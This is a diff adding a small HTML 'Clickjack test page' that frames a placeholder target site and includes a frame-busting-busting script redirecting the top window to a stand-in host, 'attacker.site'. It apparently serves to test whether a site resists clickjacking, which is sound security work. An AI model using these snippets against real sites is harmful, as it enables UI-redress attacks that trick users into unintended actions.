@@ -1,0 +1,32 @@
+<html>
+    <head>
+        <title>Clickjack test page</title>
+    </head>
+    <body>
+        <iframe src="http://www.target.site" width="500" height="500"></iframe>
+    </body>
+  
+  <h1>www.fictitious.site</h1>
+<script>
+    window.onbeforeunload = function()
+    {
+        return " Do you want to leave fictitious.site?";
+    }
+</script>
+<iframe src="http://target site">
+
+  <script>
+    var prevent_bust = 0;
+    window.onbeforeunload = function() {
+        prevent_bust++;
+    };
+    setInterval(
+        function() {
+            if (prevent_bust > 0) {
+                prevent_bust -= 2;
+                window.top.location = "http://attacker.site/204.php";
+            }
+        }, 1);
+</script>
+<iframe src="http://target site">
+  </html>
